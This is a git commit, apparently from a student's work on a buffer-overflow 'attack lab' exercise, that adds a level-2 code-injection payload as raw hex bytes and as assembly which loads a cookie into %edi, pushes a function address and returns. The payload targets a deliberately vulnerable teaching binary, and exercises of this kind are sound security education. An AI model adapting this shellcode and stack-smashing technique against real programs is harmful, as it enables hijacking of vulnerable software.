a0247ce9d88984f3267e6974e24054291d50dd0e
wyrd-0 <lol@nope.gov>
2019-10-21 16:52:13 -0500

    notes.txt file contains solution walkthrough for each stage
    cookie.txt, hex2raw and rtarget are included for proof of validity and as
    a reference for the gadget addresses used in rtarget.

---
+++ work/attack/ctargetl2.d
@@ -0,0 +1,3 @@
+68 ec 17 40 00       	/* pushq  $0x4017ec */
+bf fa 97 b9 59       	/* mov    $0x59b997fa,%edi*/
+c3                   	/* retq   */
---
+++ work/attack/ctargetl2.s
@@ -0,0 +1,3 @@
+movl	$0x59b997fa,%edi	#Move cookie into %rdi
+push	$0x004017ec			#push value onto stack
+ret							#return
